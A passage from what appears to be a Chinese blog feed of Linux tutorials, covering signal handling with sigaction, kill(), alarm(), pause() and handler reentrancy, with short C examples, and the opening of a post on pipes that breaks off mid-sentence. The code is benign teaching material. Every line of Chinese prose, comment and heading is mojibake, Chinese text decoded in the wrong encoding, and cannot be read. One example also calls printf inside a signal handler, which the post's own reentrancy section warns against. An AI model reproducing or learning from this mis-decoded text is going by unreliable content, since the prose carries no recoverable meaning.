å…¥åˆ°è¿›ç¨‹çš„ä¿¡å·å±è”½å­—ä¸­ï¼Œè®¾ç½®ä¿¡å·å±è”½å­—å¯ä»¥é˜²æ­¢ä¿¡å·åœ¨å®ƒçš„å¤„ç†å‡½æ•°è¿˜æœªè¿è¡Œç»“æŸæ—¶å°±è¢«æ¥æ”¶åˆ°çš„æƒ…å†µï¼Œå³ä½¿ç”¨sa_maskå­—æ®µå¯ä»¥æ¶ˆé™¤è¿™ä¸€ç«æ€æ¡ä»¶ã€‚</p><p>æ‰¿æ¥ä¸Šé¢çš„ä¾‹å­ï¼Œä¸‹é¢ç»™å‡ºç”¨sigaction()å‡½æ•°é‡å†™çš„ä¾‹å­ä»£ç ï¼Œæºæ–‡ä»¶ä¸ºsignal2.cï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span> <span class="token keyword">void</span> <span class="token function">ouch</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nOUCH! - I got signal %d\n"</span><span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">sigaction</span> act<span class="token punctuation">;</span>    act<span class="token punctuation">.</span>sa_handler <span class="token operator">=</span> ouch<span class="token punctuation">;</span>         <span class="token comment">// åˆ›å»ºç©ºçš„ä¿¡å·å±è”½å­—ï¼Œå³ä¸å±è”½ä»»ä½•ä¿¡æ¯</span>    <span class="token function">sigemptyset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>act<span class="token punctuation">.</span>sa_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// ä½¿sigactionå‡½æ•°é‡ç½®ä¸ºé»˜è®¤è¡Œä¸º</span>    act<span class="token punctuation">.</span>sa_flags <span class="token operator">=</span> SA_RESETHAND<span class="token punctuation">;</span>     <span class="token function">sigaction</span><span class="token punctuation">(</span>SIGINT<span class="token punctuation">,</span> <span class="token operator">&amp;</span>act<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿è¡Œç»“æœä¸å‰ä¸€ä¸ªä¾‹å­ä¸­çš„ç›¸åŒã€‚æ³¨æ„sigactionå‡½æ•°åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸è¢«é‡ç½®çš„ï¼Œå¦‚æœè¦æƒ³å®ƒé‡ç½®ï¼Œåˆ™sa_flagså°±è¦ä¸ºSA_RESETHANDã€‚</p><h3 id="äº”ã€å‘é€ä¿¡å·">äº”ã€å‘é€ä¿¡å·</h3><p>ä¸Šé¢è¯´åˆ°çš„å‡½æ•°éƒ½æ˜¯ä¸€äº›è¿›ç¨‹æ¥æ”¶åˆ°ä¸€ä¸ªä¿¡å·ä¹‹åæ€ä¹ˆå¯¹è¿™ä¸ªä¿¡å·ä½œå‡ºååº”ï¼Œå³ä¿¡å·çš„å¤„ç†çš„é—®é¢˜ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆå‡½æ•°å¯ä»¥å‘ä¸€ä¸ªè¿›ç¨‹ä¸»åŠ¨åœ°å‘å‡ºä¸€ä¸ªä¿¡å·å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤ä¸ªå‡½æ•°kill()å’Œalarm()æ¥å‘é€ä¸€ä¸ªä¿¡å·ã€‚</p><p>1ã€kill()å‡½æ•°</p><p>å…ˆæ¥çœ‹çœ‹kill()å‡½æ•°ï¼Œè¿›ç¨‹å¯ä»¥é€šè¿‡kill()å‡½æ•°å‘åŒ…æ‹¬å®ƒæœ¬èº«åœ¨å†…çš„å…¶ä»–è¿›ç¨‹å‘é€ä¸€ä¸ªä¿¡å·ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰å‘é€è¿™ä¸ªä¿¡å·çš„æƒé™ï¼Œå¯¹kill()å‡½æ•°çš„è°ƒç”¨å°±å°†å¤±è´¥ï¼Œè€Œå¤±è´¥çš„å¸¸è§åŸå› æ˜¯ç›®æ ‡è¿›ç¨‹ç”±å¦ä¸€ä¸ªç”¨æˆ·æ‰€æ‹¥æœ‰ã€‚æƒ³ä¸€æƒ³ä¹Ÿæ˜¯å®¹æ˜“æ˜ç™½çš„ï¼Œä½ æ€»ä¸èƒ½æ§åˆ¶åˆ«äººçš„ç¨‹åºå§ï¼Œå½“ç„¶è¶…çº§ç”¨æˆ·rootï¼Œè¿™ç§ä¸Šå¸èˆ¬çš„å­˜åœ¨å°±é™¤å¤–äº†ã€‚</p><p>kill()å‡½æ•°çš„åŸå‹ä¸ºï¼š</p><blockquote><p>#include &lt;sys/types.h&gt;<br>#include &lt;signal.h&gt;<br>int kill(pid_t pid, int sig);</p></blockquote><p>å®ƒçš„ä½œç”¨æŠŠä¿¡å·sigå‘é€ç»™è¿›ç¨‹å·ä¸ºpidçš„è¿›ç¨‹ï¼ŒæˆåŠŸæ—¶è¿”å›0ã€‚</p><p>kill()è°ƒç”¨å¤±è´¥è¿”å›-1ï¼Œè°ƒç”¨å¤±è´¥é€šå¸¸æœ‰ä¸‰å¤§åŸå› ï¼š</p><blockquote><p>1ã€ç»™å®šçš„ä¿¡å·æ— æ•ˆï¼ˆerrno = EINVAL)<br>2ã€å‘é€æƒé™ä¸å¤Ÿ( errno = EPERM ï¼‰<br>3ã€ç›®æ ‡è¿›ç¨‹ä¸å­˜åœ¨( errno = ESRCH )</p></blockquote><p>2ã€alarm()å‡½æ•°</p><p>è¿™ä¸ªå‡½æ•°è·Ÿå®ƒçš„åå­—ä¸€æ ·ï¼Œç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªé—¹é’Ÿçš„åŠŸèƒ½ï¼Œè¿›ç¨‹å¯ä»¥è°ƒç”¨alarm()å‡½æ•°åœ¨ç»è¿‡é¢„å®šæ—¶é—´åå‘å‘é€ä¸€ä¸ªSIGALRMä¿¡å·ã€‚</p><p>alarm()å‡½æ•°çš„å‹å¦‚ä¸‹ï¼š</p><blockquote><p>#include &lt;unistd.h&gt;<br>unsigned int alarm(unsigned int seconds);</p></blockquote><p>alarm()å‡½æ•°ç”¨æ¥åœ¨secondsç§’ä¹‹åå®‰æ’å‘é€ä¸€ä¸ªSIGALRMä¿¡å·ï¼Œå¦‚æœsecondsä¸º0ï¼Œå°†å–æ¶ˆæ‰€æœ‰å·²è®¾ç½®çš„é—¹é’Ÿè¯·æ±‚ã€‚alarm()å‡½æ•°çš„è¿”å›å€¼æ˜¯ä»¥å‰è®¾ç½®çš„é—¹é’Ÿæ—¶é—´çš„ä½™ç•™ç§’æ•°ï¼Œå¦‚æœè¿”å›å¤±è´¥è¿”å›-1ã€‚</p><p>é©¬ä¸åœè¹„ï¼Œä¸‹é¢å°±ç»™åˆfork()ã€sleep()å’Œsignal()å‡½æ•°ï¼Œç”¨ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜kill()å‡½æ•°çš„ç”¨æ³•å§ï¼Œæºæ–‡ä»¶ä¸ºsignal3.cï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span> <span class="token keyword">static</span> <span class="token keyword">int</span> alarm_fired <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">ouch</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    alarm_fired <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>    pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>        <span class="token comment">// å­è¿›ç¨‹</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// å‘çˆ¶è¿›ç¨‹å‘é€ä¿¡å·</span>        <span class="token function">kill</span><span class="token punctuation">(</span><span class="token function">getppid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SIGALRM<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>          <span class="token comment">// è®¾ç½®å¤„ç†å‡½æ•°</span>    <span class="token function">signal</span><span class="token punctuation">(</span>SIGALRM<span class="token punctuation">,</span> ouch<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>alarm_fired<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>alarm_fired<span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nI got a signal %d\n"</span><span class="token punctuation">,</span> SIGALRM<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/05/25/Dm9eOhpkYgwIHj5.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/05/25/Dm9eOhpkYgwIHj5.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>åœ¨ä»£ç ä¸­æˆ‘ä»¬ä½¿ç”¨fork()è°ƒç”¨å¤åˆ¶äº†ä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œåœ¨å­è¿›ç¨‹ä¸­ï¼Œ5ç§’åå‘çˆ¶è¿›ç¨‹ä¸­å‘é€ä¸€ä¸ªSIGALRMä¿¡å·ï¼Œçˆ¶è¿›ç¨‹ä¸­æ•è·è¿™ä¸ªä¿¡å·ï¼Œå¹¶ç”¨ouch()å‡½æ•°æ¥å¤„ç†ï¼Œå˜æ”¹alarm_firedçš„å€¼ï¼Œç„¶åé€€å‡ºå¾ªç¯ã€‚ä»ç»“æœä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°è¾“å‡ºäº†5ä¸ªHello Worldï¼ä¹‹åï¼Œç¨‹åºå°±æ”¶åˆ°ä¸€ä¸ªSIGARLMä¿¡å·ï¼Œç„¶åç»“æŸäº†è¿›ç¨‹ã€‚</p><p>æ³¨ï¼šå¦‚æœçˆ¶è¿›ç¨‹åœ¨å­è¿›ç¨‹çš„ä¿¡å·åˆ°æ¥ä¹‹å‰æ²¡æœ‰äº‹æƒ…å¯åšï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å‡½æ•°pause()æ¥æŒ‚èµ·çˆ¶è¿›ç¨‹ï¼Œç›´åˆ°çˆ¶è¿›ç¨‹æ¥æ”¶åˆ°ä¿¡å·ã€‚å½“è¿›ç¨‹æ¥æ”¶åˆ°ä¸€ä¸ªä¿¡å·æ—¶ï¼Œé¢„è®¾å¥½çš„ä¿¡å·å¤„ç†å‡½æ•°å°†å¼€å§‹è¿è¡Œï¼Œç¨‹åºä¹Ÿå°†æ¢å¤æ­£å¸¸çš„æ‰§è¡Œã€‚è¿™æ ·å¯ä»¥èŠ‚çœCPUçš„èµ„æºï¼Œå› ä¸ºå¯ä»¥é¿å…ä½¿ç”¨ä¸€ä¸ªå¾ªç¯æ¥ç­‰å¾…ã€‚ä»¥æœ¬ä¾‹å­ä¸ºä¾‹ï¼Œåˆ™å¯ä»¥æŠŠwhileå¾ªç¯æ”¹ä¸ºä¸€å¥pause();</p><p>ä¸‹é¢å†ä»¥ä¸€ä¸ªå°å°çš„ä¾‹å­æ¥è¯´æ˜alarmå‡½æ•°å’Œpauseå‡½æ•°çš„ç”¨æ³•å§ï¼Œæºæ–‡ä»¶åä¸ºï¼Œsignal4.cï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span> <span class="token keyword">static</span> <span class="token keyword">int</span> alarm_fired <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">ouch</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    alarm_fired <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// å…³è”ä¿¡å·å¤„ç†å‡½æ•°</span>    <span class="token function">signal</span><span class="token punctuation">(</span>SIGALRM<span class="token punctuation">,</span> ouch<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// è°ƒç”¨alarmå‡½æ•°ï¼Œ5ç§’åå‘é€ä¿¡å·SIGALRM</span>    <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// æŒ‚èµ·è¿›ç¨‹</span>    <span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// æ¥æ”¶åˆ°ä¿¡å·åï¼Œæ¢å¤æ­£å¸¸æ‰§è¡Œ</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>alarm_fired <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Receive a signal %d\n"</span><span class="token punctuation">,</span> SIGALRM<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/05/25/71CwryWLTu34adB.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/05/25/71CwryWLTu34adB.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>è¿›ç¨‹åœ¨5ç§’åæ¥æ”¶åˆ°ä¸€ä¸ªSIGALRMï¼Œè¿›ç¨‹æ¢å¤è¿è¡Œï¼Œæ‰“å°ä¿¡æ¯å¹¶é€€å‡ºã€‚</p><h3 id="å…­ã€ä¿¡å·å¤„ç†å‡½æ•°çš„å®‰å…¨é—®é¢˜">å…­ã€ä¿¡å·å¤„ç†å‡½æ•°çš„å®‰å…¨é—®é¢˜</h3><p>è¯•æƒ³ä¸€ä¸ªé—®é¢˜ï¼Œå½“è¿›ç¨‹æ¥æ”¶åˆ°ä¸€ä¸ªä¿¡å·æ—¶ï¼Œè½¬åˆ°ä½ å…³è”çš„å‡½æ•°ä¸­æ‰§è¡Œï¼Œä½†æ˜¯åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œè¿›ç¨‹åˆæ¥æ”¶åˆ°åŒä¸€ä¸ªä¿¡å·æˆ–å¦ä¸€ä¸ªä¿¡å·ï¼Œåˆè¦æ‰§è¡Œç›¸å…³è”çš„å‡½æ•°æ—¶ï¼Œç¨‹åºä¼šæ€ä¹ˆæ‰§è¡Œï¼Ÿ</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¿¡å·å¤„ç†å‡½æ•°å¯ä»¥åœ¨å…¶æ‰§è¡ŒæœŸé—´è¢«ä¸­æ–­å¹¶è¢«å†æ¬¡è°ƒç”¨ã€‚å½“è¿”å›åˆ°ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ï¼Œå®ƒèƒ½å¦ç»§ç»­æ­£ç¡®æ“ä½œæ˜¯å¾ˆå…³é”®çš„ã€‚è¿™ä¸ä»…ä»…æ˜¯é€’å½’çš„é—®é¢˜ï¼Œè€Œæ˜¯å¯é‡å…¥çš„ï¼ˆå³å¯ä»¥å®Œå…¨åœ°è¿›å…¥å’Œå†æ¬¡æ‰§è¡Œï¼‰çš„é—®é¢˜ã€‚è€Œåè§‚Linuxï¼Œå…¶å†…æ ¸åœ¨åŒä¸€æ—¶æœŸè´Ÿè´£å¤„ç†å¤šä¸ªè®¾å¤‡çš„ä¸­æ–­æœåŠ¡ä¾‹ç¨‹å°±éœ€è¦å¯é‡å…¥çš„ï¼Œå› ä¸ºä¼˜å…ˆçº§æ›´é«˜çš„ä¸­æ–­å¯èƒ½ä¼šåœ¨åŒä¸€æ®µä»£ç çš„æ‰§è¡ŒæœŸé—´â€œæ’å…¥â€è¿›æ¥ã€‚</p><p>ç®€è¨€ä¹‹ï¼Œå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„ä¿¡å·å¤„ç†å‡½æ•°è¦æ˜¯å¯é‡å…¥çš„ï¼Œå³ç¦»å¼€åå¯å†æ¬¡å®‰å…¨åœ°è¿›å…¥å’Œå†æ¬¡æ‰§è¡Œï¼Œè¦ä½¿ä¿¡å·å¤„ç†å‡½æ•°æ˜¯å¯é‡å…¥çš„ï¼Œåˆ™åœ¨ä¿¡æ¯å¤„ç†å‡½æ•°ä¸­ä¸èƒ½è°ƒç”¨ä¸å¯é‡å…¥çš„å‡½æ•°ã€‚ä¸‹é¢ç»™å‡ºå¯é‡å…¥çš„å‡½æ•°åœ¨åˆ—è¡¨ï¼Œä¸åœ¨æ­¤è¡¨ä¸­çš„å‡½æ•°éƒ½æ˜¯ä¸å¯é‡å…¥çš„ï¼Œå¯é‡å…¥å‡½æ•°è¡¨å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/05/25/SlaWkNt3p87BqJX.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/05/25/SlaWkNt3p87BqJX.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><h3 id="ä¸ƒã€é™„å½•-â€”â€”-ä¿¡å·è¡¨">ä¸ƒã€é™„å½• â€”â€” ä¿¡å·è¡¨</h3><p><img src="https://s2.loli.net/2022/05/25/JLl8s5htVBdn9cr.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/05/25/JLl8s5htVBdn9cr.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>å¦‚æœè¿›ç¨‹æ¥æ”¶åˆ°ä¸Šé¢è¿™äº›ä¿¡å·ä¸­çš„ä¸€ä¸ªï¼Œè€Œäº‹å…ˆåˆæ²¡æœ‰å®‰æ’æ•è·å®ƒï¼Œè¿›ç¨‹å°±ä¼šç»ˆæ­¢ã€‚</p><p>è¿˜æœ‰å…¶ä»–çš„ä¸€äº›ä¿¡å·ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/05/25/nH7DpPithNRMBUy.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/05/25/nH7DpPithNRMBUy.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><hr><p><strong>pause()å‡½æ•°ï¼šè®©è¿›ç¨‹æš‚åœç›´åˆ°ä¿¡å·å‡ºç°</strong></p><table><thead><tr><th></th><th>pauseï¼ˆè®©è¿›ç¨‹æš‚åœç›´åˆ°ä¿¡å·å‡ºç°ï¼‰</th></tr></thead><tbody><tr><td>ç›¸å…³å‡½æ•°</td><td>killï¼Œsignalï¼Œsleep</td></tr><tr><td>è¡¨å¤´æ–‡ä»¶</td><td>#include &lt;unistd.h&gt;</td></tr><tr><td>å®šä¹‰å‡½æ•°</td><td>int pause(void);</td></tr><tr><td>å‡½æ•°è¯´æ˜</td><td>pause()ä¼šä»¤ç›®å‰çš„è¿›ç¨‹æš‚åœï¼ˆè¿›å…¥ç¡çœ çŠ¶æ€ï¼‰ï¼Œç›´åˆ°è¢«ä¿¡å·(signal)æ‰€ä¸­æ–­ã€‚</td></tr><tr><td>è¿”å›å€¼</td><td>åªè¿”å›-1ã€‚</td></tr><tr><td>é”™è¯¯ä»£ç </td><td>EINTR æœ‰ä¿¡å·åˆ°è¾¾ä¸­æ–­äº†æ­¤å‡½æ•°ã€‚</td></tr></tbody></table><p>å‚è€ƒï¼š</p><p><a href="http://blog.csdn.net/ljianhui/article/details/10128731">http://blog.csdn.net/ljianhui/article/details/10128731</a></p><p>ã€ŠLinux é«˜æ€§èƒ½æœåŠ¡å™¨ç¼–ç¨‹ã€‹</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> é€šä¿¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux çš„è¿›ç¨‹é—´é€šä¿¡ï¼šç®¡é“</title>
      <link href="/posts/4502c3a8/"/>
      <url>/posts/4502c3a8/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><strong>å‰è¨€</strong></h2><div class="story post-story"><p>ç®¡é“æ˜¯UNIXç¯å¢ƒä¸­å†å²æœ€æ‚ ä¹…çš„è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ã€‚æœ¬æ–‡ä¸»è¦è¯´æ˜åœ¨Linuxç¯å¢ƒä¸Šå¦‚ä½•ä½¿ç”¨ç®¡é“ã€‚é˜…è¯»æœ¬æ–‡å¯ä»¥å¸®ä½ è§£å†³ä»¥ä¸‹é—®é¢˜ï¼š</p><ol><li>ä»€ä¹ˆæ˜¯ç®¡é“å’Œä¸ºä»€ä¹ˆè¦æœ‰ç®¡é“ï¼Ÿ</li><li>ç®¡é“æ€ä¹ˆåˆ†ç±»ï¼Ÿ</li><li>ç®¡é“çš„å®ç°æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ</li><li>ç®¡é“æœ‰å¤šå¤§ï¼Ÿ</li><li>ç®¡é“çš„å¤§å°æ˜¯ä¸æ˜¯å¯ä»¥è°ƒæ•´ï¼Ÿå¦‚ä½•è°ƒæ•´ï¼Ÿ</li></ol></div><h2 id="ä»€ä¹ˆæ˜¯ç®¡é“ï¼Ÿ"><strong>ä»€ä¹ˆæ˜¯ç®¡é“ï¼Ÿ</strong></h2><div class="story post-story"><p>ç®¡é“ï¼Œè‹±æ–‡ä¸ºpipeã€‚è¿™æ˜¯ä¸€ä¸ªæˆ‘ä»¬åœ¨å­¦ä¹ Linuxå‘½ä»¤è¡Œçš„æ—¶å€™å°±ä¼šå¼•å…¥çš„ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µã€‚å®ƒçš„å‘æ˜äººæ˜¯é“æ ¼æ‹‰æ–¯.éº¦å…‹ç½—ä¼Šï¼Œè¿™ä½ä¹Ÿæ˜¯UNIXä¸Šæ—©æœŸshellçš„å‘æ˜äººã€‚ä»–åœ¨å‘æ˜äº†shellä¹‹åï¼Œå‘ç°ç³»ç»Ÿæ“ä½œæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œç»å¸¸æœ‰éœ€æ±‚è¦å°†ä¸€ä¸ªç¨‹åºçš„è¾“å‡ºäº¤ç»™å¦ä¸€ä¸ªç¨‹åºè¿›è¡Œå¤„ç†ï¼Œè¿™ç§æ“ä½œå¯ä»¥ä½¿ç”¨è¾“å…¥è¾“å‡ºé‡å®šå‘åŠ æ–‡ä»¶æå®šï¼Œæ¯”å¦‚ï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ ls  <span class="token operator">-</span>l <span class="token operator">/</span>etc<span class="token operator">/</span> <span class="token operator">></span> etc<span class="token punctuation">.</span>txt<span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ wc <span class="token operator">-</span>l etc<span class="token punctuation">.</span>txt <span class="token number">183</span> etc<span class="token punctuation">.</span>txt</code></pre><p>ä½†æ˜¯è¿™æ ·æœªå…æ˜¾å¾—å¤ªéº»çƒ¦äº†ã€‚æ‰€ä»¥ï¼Œç®¡é“çš„æ¦‚å¿µåº”è¿è€Œç”Ÿã€‚ç›®å‰åœ¨ä»»ä½•ä¸€ä¸ªshellä¸­ï¼Œéƒ½å¯ä»¥ä½¿ç”¨â€œ|â€è¿æ¥ä¸¤ä¸ªå‘½ä»¤ï¼Œshellä¼šå°†å‰åä¸¤ä¸ªè¿›ç¨‹çš„è¾“å…¥è¾“å‡ºç”¨ä¸€ä¸ªç®¡é“ç›¸è¿ï¼Œä»¥ä¾¿è¾¾åˆ°è¿›ç¨‹é—´é€šä¿¡çš„ç›®çš„ï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">[</span>zorro@zorro<span class="token operator">-</span>pc pipe<span class="token punctuation">]</span>$ ls <span class="token operator">-</span>l <span class="token operator">/</span>etc<span class="token operator">/</span> <span class="token operator">|</span> wc <span class="token operator">-</span>l<span class="token number">183</span></code></pre><p>å¯¹æ¯”ä»¥ä¸Šä¸¤ç§æ–¹æ³•ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç†è§£ä¸ºï¼Œç®¡é“æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå‰é¢çš„è¿›ç¨‹ä»¥å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œåé¢çš„è¿›ç¨‹ä»¥è¯»æ–¹å¼æ‰“å¼€ã€‚è¿™æ 